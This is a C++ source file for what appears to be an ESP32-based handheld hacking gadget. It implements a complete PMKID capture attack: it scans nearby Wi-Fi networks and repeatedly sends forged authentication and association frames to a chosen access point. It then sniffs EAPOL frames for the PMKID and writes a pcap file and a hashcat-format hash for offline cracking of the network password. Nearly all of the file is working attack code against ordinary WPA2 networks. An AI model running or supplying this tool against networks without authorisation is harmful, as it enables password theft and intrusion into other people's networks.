#include "scene_pmkid.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "core/vfs_mgr.h"
#include <vector>
#include <math.h>

namespace scene_pmkid {

enum PmkidState : uint8_t {
  STATE_SCANNING = 0,
  STATE_SELECT_NET,
  STATE_ATTACKING,
  STATE_DONE
};

#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic        = 0xa1b2c3d4;
  uint16_t ver_major    = 2;
  uint16_t ver_minor    = 4;
  int32_t  thiszone     = 0;
  uint32_t sigfigs      = 0;
  uint32_t snaplen      = 65535;
  uint32_t network      = 105;
};

struct PcapPktHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};
#pragma pack(pop)

struct ScannedTarget {
  char    ssid[33];
  char    bssidStr[18];
  uint8_t bssid[6];
  uint8_t channel;
  int32_t rssi;
};

static PmkidState s_state = STATE_SCANNING;
static std::vector<ScannedTarget> s_nets;
static int s_sel = 0;
static float s_scroll = 0.0f;
static float s_targetScroll = 0.0f;
static float s_barY = 16.0f;

static ScannedTarget s_target;
static uint8_t s_pmkid[16];
static bool s_pmkidFound = false;
static uint32_t s_attackStartMs = 0;
static uint32_t s_lastAssocMs = 0;
static uint32_t s_pktsChecked = 0;
static char s_savedPcapPath[64] = "";
static char s_savedHashPath[64] = "";

static uint8_t s_capturedPkt[512];
static uint16_t s_capturedPktLen = 0;
static volatile bool s_rxActive = false;

static const uint8_t kEapolLlc[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};

static bool parseMac(const char* str, uint8_t out[6]) {
  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

static void savePcapAndHash() {
  char safeSsid[20] = {};
  for (int i = 0; i < 16 && s_target.ssid[i]; i++) {
    char c = s_target.ssid[i];
    safeSsid[i] = (isalnum(c) || c == '-' || c == '_') ? c : '_';
  }
  if (safeSsid[0] == '\0') strcpy(safeSsid, "target");

  snprintf(s_savedPcapPath, sizeof(s_savedPcapPath), "/pcaps/pmkid_%s.pcap", safeSsid);
  snprintf(s_savedHashPath, sizeof(s_savedHashPath), "/pcaps/pmkid_%s.22000", safeSsid);

  vfs::mkdir("/pcaps");
  File fp = vfs::open(s_savedPcapPath, FILE_WRITE);
  File fh = vfs::open(s_savedHashPath, FILE_WRITE);

  if (fp && s_capturedPktLen > 0) {
    PcapGlobalHdr gh;
    fp.write((const uint8_t*)&gh, sizeof(gh));

    PcapPktHdr ph;
    ph.ts_sec = (uint32_t)(millis() / 1000);
    ph.ts_usec = (millis() % 1000) * 1000;
    ph.incl_len = s_capturedPktLen;
    ph.orig_len = s_capturedPktLen;
    fp.write((const uint8_t*)&ph, sizeof(ph));
    fp.write(s_capturedPkt, s_capturedPktLen);
    fp.close();
  }

  if (fh && s_pmkidFound) {
    char pmkidHex[33] = {};
    for (int i = 0; i < 16; i++) {
      sprintf(pmkidHex + (i * 2), "%02x", s_pmkid[i]);
    }
    char bssidHex[13] = {};
    for (int i = 0; i < 6; i++) {
      sprintf(bssidHex + (i * 2), "%02x", s_target.bssid[i]);
    }
    uint8_t staMac[6];
    WiFi.macAddress(staMac);
    char staHex[13] = {};
    for (int i = 0; i < 6; i++) {
      sprintf(staHex + (i * 2), "%02x", staMac[i]);
    }
    char ssidHex[65] = {};
    size_t slen = strlen(s_target.ssid);
    for (size_t i = 0; i < slen; i++) {
      sprintf(ssidHex + (i * 2), "%02x", (uint8_t)s_target.ssid[i]);
    }

    fh.printf("WPA*02*%s*%s*%s*%s***\n", pmkidHex, bssidHex, staHex, ssidHex);
    fh.close();
  }
}

static IRAM_ATTR void pmkidSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!s_rxActive || s_pmkidFound) return;
  const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
  int pktLen = raw->rx_ctrl.sig_len;
  if (pktLen < 40 || pktLen > 512) return;

  const uint8_t* p = raw->payload;
  uint8_t fc0 = p[0];
  if ((fc0 & 0x0C) != 0x08) return;

  uint8_t fc1 = p[1];
  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;

  const uint8_t* bssid = nullptr;
  if (!toDS && !fromDS) bssid = p + 16;
  else if (toDS && !fromDS) bssid = p + 4;
  else if (!toDS && fromDS) bssid = p + 10;
  else bssid = p + 16;

  if (memcmp(bssid, s_target.bssid, 6) != 0) return;

  s_pktsChecked++;

  int macHdrLen = 24;
  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (subtype == 8 || subtype == 9 || subtype == 10 || subtype == 11) {
    macHdrLen = 26;
  }
  if (pktLen < macHdrLen + 8) return;

  const uint8_t* llc = p + macHdrLen;
  if (memcmp(llc, kEapolLlc, 8) != 0) return;

  const uint8_t* eapol = llc + 8;
  int eapolLen = pktLen - macHdrLen - 8;
  if (eapolLen < 99) return;

  uint16_t keyDataLen = ((uint16_t)eapol[97] << 8) | eapol[98];
  if (keyDataLen > 0 && eapolLen >= 99 + keyDataLen) {
    const uint8_t* kd = eapol + 99;
    int remaining = keyDataLen;

    while (remaining >= 22) {
      if (kd[0] == 0xDD) {
        uint8_t elen = kd[1];
        if (elen >= 20 && remaining >= elen + 2) {
          if (kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            memcpy(s_pmkid, kd + 6, 16);
            s_pmkidFound = true;
            s_capturedPktLen = (pktLen > 512) ? 512 : pktLen;
            memcpy(s_capturedPkt, p, s_capturedPktLen);
            return;
          }
        }
      }
      uint8_t step = kd[1] + 2;
      if (step == 0 || step > remaining) break;
      kd += step;
      remaining -= step;
    }
  }
}

static void sendAuthAndAssoc() {
  uint8_t staMac[6];
  WiFi.macAddress(staMac);

  uint8_t authPkt[] = {
    0xB0, 0x00, 0x00, 0x00,
    s_target.bssid[0], s_target.bssid[1], s_target.bssid[2], s_target.bssid[3], s_target.bssid[4], s_target.bssid[5],
    staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5],
    s_target.bssid[0], s_target.bssid[1], s_target.bssid[2], s_target.bssid[3], s_target.bssid[4], s_target.bssid[5],
    0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00,
    0x00, 0x00
  };
  esp_wifi_80211_tx(WIFI_IF_STA, authPkt, sizeof(authPkt), false);

  uint8_t assocPkt[128];
  int pos = 0;
  assocPkt[pos++] = 0x00; assocPkt[pos++] = 0x00;
  assocPkt[pos++] = 0x00; assocPkt[pos++] = 0x00;
  memcpy(assocPkt + pos, s_target.bssid, 6); pos += 6;
  memcpy(assocPkt + pos, staMac, 6); pos += 6;
  memcpy(assocPkt + pos, s_target.bssid, 6); pos += 6;
  assocPkt[pos++] = 0x10; assocPkt[pos++] = 0x00;
  assocPkt[pos++] = 0x31; assocPkt[pos++] = 0x04;
  assocPkt[pos++] = 0x05; assocPkt[pos++] = 0x00;

  assocPkt[pos++] = 0x00;
  uint8_t slen = (uint8_t)strlen(s_target.ssid);
  assocPkt[pos++] = slen;
  memcpy(assocPkt + pos, s_target.ssid, slen); pos += slen;

  const uint8_t supRates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
  memcpy(assocPkt + pos, supRates, sizeof(supRates)); pos += sizeof(supRates);

  const uint8_t rsnIe[] = {
    0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00
  };
  memcpy(assocPkt + pos, rsnIe, sizeof(rsnIe)); pos += sizeof(rsnIe);

  esp_wifi_80211_tx(WIFI_IF_STA, assocPkt, pos, false);
}

static void startScan() {
  s_state = STATE_SCANNING;
  s_nets.clear();
  s_sel = 0;
  s_scroll = 0.0f;
  s_targetScroll = 0.0f;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.scanNetworks(true);
}

void open() {
  s_state = STATE_SCANNING;
  s_pmkidFound = false;
  s_rxActive = false;
  startScan();
}

void close() {
  s_rxActive = false;
  esp_wifi_set_promiscuous(false);
  WiFi.scanDelete();
  WiFi.disconnect();
}

bool onBack() {
  if (s_state == STATE_ATTACKING || s_state == STATE_DONE) {
    s_rxActive = false;
    esp_wifi_set_promiscuous(false);
    s_state = STATE_SELECT_NET;
    return true;
  }
  return false;
}

void tick(uint32_t now) {
  if (s_state == STATE_SCANNING) {
    int16_t n = WiFi.scanComplete();
    if (n >= 0) {
      s_nets.clear();
      for (int i = 0; i < n; i++) {
        ScannedTarget t;
        strncpy(t.ssid, WiFi.SSID(i).c_str(), 32);
        t.ssid[32] = '\0';
        strncpy(t.bssidStr, WiFi.BSSIDstr(i).c_str(), 17);
        t.bssidStr[17] = '\0';
        parseMac(t.bssidStr, t.bssid);
        t.channel = WiFi.channel(i);
        t.rssi = WiFi.RSSI(i);
        s_nets.push_back(t);
      }
      WiFi.scanDelete();
      s_state = STATE_SELECT_NET;
    }
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_nets.size();
    int maxLines = 4;
    int maxScroll = total - maxLines;
    if (maxScroll < 0) maxScroll = 0;

    int topIndex = (int)(s_targetScroll / 12.0f + 0.5f);
    if (s_sel < topIndex) s_targetScroll = s_sel * 12.0f;
    else if (s_sel >= topIndex + maxLines) s_targetScroll = (s_sel - maxLines + 1) * 12.0f;

    if (s_targetScroll < 0) s_targetScroll = 0;
    if (s_targetScroll > maxScroll * 12.0f) s_targetScroll = maxScroll * 12.0f;

    float ds = s_targetScroll - s_scroll;
    if (fabsf(ds) > 0.1f) s_scroll += ds * 0.35f;
    else s_scroll = s_targetScroll;

    float targetBarY = 16.0f + s_sel * 12.0f - s_scroll;
    float dy = targetBarY - s_barY;
    if (fabsf(dy) > 0.1f) s_barY += dy * 0.4f;
    else s_barY = targetBarY;
  } else if (s_state == STATE_ATTACKING) {
    if (s_pmkidFound) {
      s_rxActive = false;
      esp_wifi_set_promiscuous(false);
      savePcapAndHash();
      s_state = STATE_DONE;
      return;
    }

    if (now - s_lastAssocMs >= 800) {
      s_lastAssocMs = now;
      sendAuthAndAssoc();
    }
  }
}

void onKey(const KeyEvent& ev) {
  if (s_state == STATE_SELECT_NET) {
    int total = (int)s_nets.size();
    if (total == 0) {
      if (ev.key == BTN_OK && !ev.repeat) startScan();
      return;
    }

    if (ev.key == BTN_UP) {
      if (s_sel > 0) s_sel--;
      else s_sel = total - 1;
    } else if (ev.key == BTN_DOWN) {
      if (s_sel < total - 1) s_sel++;
      else s_sel = 0;
    } else if (ev.key == BTN_OK && !ev.repeat) {
      s_target = s_nets[s_sel];
      s_pmkidFound = false;
      s_pktsChecked = 0;
      s_capturedPktLen = 0;
      s_attackStartMs = millis();
      s_lastAssocMs = 0;

      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      esp_wifi_set_channel(s_target.channel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_promiscuous_rx_cb(&pmkidSniffer);
      esp_wifi_set_promiscuous(true);
      s_rxActive = true;

      s_state = STATE_ATTACKING;
    }
  } else if (s_state == STATE_DONE) {
    if (ev.key == BTN_OK && !ev.repeat) {
      s_state = STATE_SELECT_NET;
    }
  }
}

void draw(U8G2& u8g2, uint32_t now) {
  (void)now;
  u8g2.setDrawColor(0);
  u8g2.drawBox(0, 0, 128, 14);
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, 128, 14);
  u8g2.setDrawColor(0);
  u8g2.setFont(u8g2_font_7x14B_tr);
  u8g2.drawStr(4, 11, "PMKID CAPTURE");

  u8g2.setFont(u8g2_font_5x8_tr);
  const char* badge = (s_state == STATE_SCANNING)   ? "SCAN" :
                      (s_state == STATE_SELECT_NET) ? "SELECT" :
                      (s_state == STATE_ATTACKING)  ? "ATTACK" : "FOUND";
  int bw = u8g2.getStrWidth(badge);
  u8g2.drawStr(124 - bw, 10, badge);
  u8g2.setDrawColor(1);

  if (s_state == STATE_SCANNING) {
    u8g2.setFont(u8g2_font_6x12_tr);
    const char* m = "Scanning Wi-Fi...";
    u8g2.drawStr((128 - u8g2.getStrWidth(m)) / 2, 40, m);
  } else if (s_state == STATE_SELECT_NET) {
    if (s_nets.empty()) {
      u8g2.setFont(u8g2_font_6x12_tr);
      const char* m = "No networks found";
      u8g2.drawStr((128 - u8g2.getStrWidth(m)) / 2, 40, m);
    } else {
      u8g2.setFont(u8g2_font_6x10_tr);
      for (size_t i = 0; i < s_nets.size(); i++) {
        int y = 16 + (int)(i * 12 - s_scroll + 0.5f);
        if (y < 14 || y > 64) continue;

        char buf[32];
        const char* sname = s_nets[i].ssid[0] ? s_nets[i].ssid : "<Hidden>";
        snprintf(buf, sizeof(buf), "%s", sname);

        if ((int)i == s_sel) {
          u8g2.setDrawColor(1);
          u8g2.drawBox(2, y - 1, 124, 12);
          u8g2.setDrawColor(0);
          u8g2.drawStr(5, y + 8, buf);
          char chStr[8];
          snprintf(chStr, sizeof(chStr), "c%d", s_nets[i].channel);
          u8g2.drawStr(122 - u8g2.getStrWidth(chStr), y + 8, chStr);
          u8g2.setDrawColor(1);
        } else {
          u8g2.drawStr(5, y + 8, buf);
          char chStr[8];
          snprintf(chStr, sizeof(chStr), "c%d", s_nets[i].channel);
          u8g2.drawStr(122 - u8g2.getStrWidth(chStr), y + 8, chStr);
        }
      }
    }
  } else if (s_state == STATE_ATTACKING) {
    u8g2.setFont(u8g2_font_6x10_tr);
    char buf[36];
    snprintf(buf, sizeof(buf), "AP: %s", s_target.ssid);
    u8g2.drawStr(4, 25, buf);

    snprintf(buf, sizeof(buf), "CH: %d  RSSI: %ld", s_target.channel, (long)s_target.rssi);
    u8g2.drawStr(4, 37, buf);

    uint32_t sec = (millis() - s_attackStartMs) / 1000;
    snprintf(buf, sizeof(buf), "Sending Assoc Req (%lus)...", (unsigned long)sec);
    u8g2.drawStr(4, 49, buf);

    snprintf(buf, sizeof(buf), "EAPOL Checked: %lu", (unsigned long)s_pktsChecked);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(4, 61, buf);
  } else if (s_state == STATE_DONE) {
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(4, 24, "PMKID Captured!");

    char hex[24];
    snprintf(hex, sizeof(hex), "%02x%02x%02x%02x%02x%02x...", 
             s_pmkid[0], s_pmkid[1], s_pmkid[2], s_pmkid[3], s_pmkid[4], s_pmkid[5]);
    u8g2.drawStr(4, 36, hex);

    u8g2.setFont(u8g2_font_5x8_tr);
    char pathBuf[36];
    snprintf(pathBuf, sizeof(pathBuf), "Saved: %s", s_savedPcapPath);
    u8g2.drawStr(4, 48, pathBuf);

    snprintf(pathBuf, sizeof(pathBuf), "Hash:  %s", s_savedHashPath);
    u8g2.drawStr(4, 60, pathBuf);
  }
}

}
